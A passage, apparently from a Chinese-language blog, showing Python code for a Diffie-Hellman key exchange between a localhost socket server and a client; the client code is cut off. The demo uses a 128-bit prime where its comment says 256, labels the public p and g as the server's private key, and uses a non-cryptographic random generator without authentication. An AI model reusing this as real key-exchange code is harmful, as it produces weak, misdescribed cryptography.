&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; socket&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; mpz&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;number &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; getPrime&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sympy &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; primitive_root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;generate_prime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 调用 getPrime (bits) 函数生成一个素数 p&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; getPrime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 将 p 转换为 GMP 的整数类型（mpz）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 检查 p 的位长度是否等于指定的位数 bits&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bit_length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; bits&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; p&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;generate_public_key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 计算公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;generate_shared_secret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 计算共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建 Socket 对象&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 绑定主机和端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 监听连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;listen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;服务器正在监听端口:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 接受客户端连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;accept&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;连接已建立。客户端地址:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成 256 位的素数 p 和本原根 g&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; generate_prime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; primitive_root&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成服务器的私钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;服务器的私钥p:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;服务器的私钥g:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;XB &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成服务器的公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key_server &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; generate_public_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; XB&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 将 p 和 g 发送给客户端&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 等待客户端发送公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public_key_client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key_server&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 生成服务器的共享密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shared_secret_server &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; generate_shared_secret&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key_client&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; XB&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 发送服务器的共享密钥给客户端&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 关闭连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;服务器的共享密钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;shared_secret_server&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;server_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;客户端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#客户端&#34;&gt;#&lt;/a&gt; 客户端&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; socket&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;generate_public_key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 计算公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; private_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 